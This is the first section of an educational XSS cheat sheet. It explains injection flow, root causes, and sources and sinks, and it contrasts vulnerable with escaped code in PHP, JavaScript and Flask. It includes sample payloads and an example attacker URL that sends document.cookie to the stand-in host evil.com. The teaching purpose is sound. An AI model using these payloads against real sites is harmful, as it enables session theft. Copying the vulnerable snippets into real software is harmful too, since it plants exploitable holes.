# 🛡️ XSS Cheat Sheet — Cross-Site Scripting

> **For educational purposes only.**

---

## 📚 Table of Contents

- [1. Introduction](#1-introduction)
  - [What is XSS?](#what-is-xss)
  - [How does it work?](#how-does-it-work)
  - [Root Causes](#root-causes)

---

## 1. Introduction

---

### What is XSS?

**XSS (Cross-Site Scripting)** is a web security vulnerability that allows an attacker to inject and execute malicious scripts in a victim's browser, bypassing the same-origin policy.

It ranks consistently in the **OWASP Top 10** and affects millions of websites worldwide.

```
Normal Request:
  User → [Web Application] → Database → Response → Browser

XSS Attack:
  Attacker → [Malicious Payload] → Web App → Victim's Browser
                                                    ↓
                                         Cookies / Sessions stolen
                                         Keystrokes logged
                                         Page content manipulated
```

---

### 🔍 How does it work?

XSS attacks happen in **3 stages:**

```
┌─────────────────────────────────────────────────────────────────┐
│                        XSS ATTACK FLOW                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1️⃣  INJECTION                                                  │
│     Attacker injects malicious input into the application       │
│                                                                 │
│         <input value="<script>alert(1)</script>">               │
│                                                                 │
│  2️⃣  STORAGE / REFLECTION                                       │
│     App renders the input without sanitization into the page    │
│                                                                 │
│         <p>Hello, <script>alert(1)</script>!</p>                │
│                                                                 │
│  3️⃣  EXECUTION                                                  │
│     Victim visits the page → Script executes in their browser   │
│                                                                 │
│         👤 Victim Browser → ⚡ Malicious JS Runs                │
│                           → 🍪 Cookies stolen                   │
│                           → 🔑 Session hijacked                 │
│                           → 📤 Data exfiltrated                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### Simple Example:

Vulnerable server-side code:
```php
// ❌ VULNERABLE
echo "Hello, " . $_GET['name'];

// Browser receives:
// Hello, <script>document.cookie</script>
```

Attacker's crafted URL:
```
https://site.com/hello?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

---

### ⚠️ Root Causes

```
┌──────────────────────────────────────────────────────────────────────┐
│                        XSS ROOT CAUSES                               │
├────────────────────────────┬─────────────────────────────────────────┤
│  CAUSE                     │  EXPLANATION                            │
├────────────────────────────┼─────────────────────────────────────────┤
│ 🚫 No Input Validation     │ User-supplied data is accepted as-is,   │
│                            │ without filtering or rejecting          │
│                            │ dangerous characters                    │
├────────────────────────────┼─────────────────────────────────────────┤
│ 🚫 No Output Encoding      │ Data is rendered directly as HTML       │
│                            │ instead of being HTML-encoded first     │
├────────────────────────────┼─────────────────────────────────────────┤
│ 🚫 Missing CSP             │ No Content Security Policy header is    │
│                            │ set to restrict script execution        │
├────────────────────────────┼─────────────────────────────────────────┤
│ 🚫 Unsafe DOM Handling     │ JavaScript uses innerHTML, eval(),      │
│                            │ document.write() with untrusted data    │
├────────────────────────────┼─────────────────────────────────────────┤
│ 🚫 Framework Misuse        │ Security features of the framework are  │
│                            │ disabled or bypassed (e.g. auto-escape) │
└────────────────────────────┴─────────────────────────────────────────┘
```

#### Vulnerable Sources & Sinks:

```
SOURCES  (Where attacker-controlled input enters the application):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📥 URL parameters        → ?search=<payload>
  📥 Form fields           → <input name="username">
  📥 HTTP Headers          → User-Agent, Referer, Cookie
  📥 JSON / API responses  → {"name": "<payload>"}
  📥 localStorage / Cookie → document.cookie

SINKS  (Where input is unsafely rendered or executed):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ innerHTML / outerHTML
  ⚡ document.write()
  ⚡ eval() / setTimeout(string) / setInterval(string)
  ⚡ element.src / element.href
  ⚡ jQuery: $(), .html(), .append()
```

#### Code Comparison:

```javascript
// ❌ VULNERABLE — Executes attacker script
document.getElementById("output").innerHTML = userInput;
// Attacker input: "<img src=x onerror=alert(document.cookie)>"

// ✅ SAFE — Renders as plain text, no execution
document.getElementById("output").textContent = userInput;
```

```python
# ❌ VULNERABLE — Flask/Python
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return f"<h1>Hello, {name}!</h1>"  # Direct injection into HTML

# ✅ SAFE — Using escape()
from markupsafe import escape

@app.route('/hello')
def hello():
    name = request.args.get('name')
    return f"<h1>Hello, {escape(name)}!</h1>"
```

---

```
╔══════════════════════════════════════════════════════════════════╗
║                        GOLDEN RULE                               ║
║                                                                  ║
║  Never trust user input. Always:                                 ║
║                                                                  ║
║     🔴  UNTRUSTED  —  Treat all input as malicious               ║
║     🔵  VALIDATE   —  Check and reject on the server side        ║
║     🟢  ENCODE     —  HTML-encode everything on output           ║
╚══════════════════════════════════════════════════════════════════╝
```

---

*XSS Cheat Sheet · Section 1 of 6*  
*For educational purposes only*
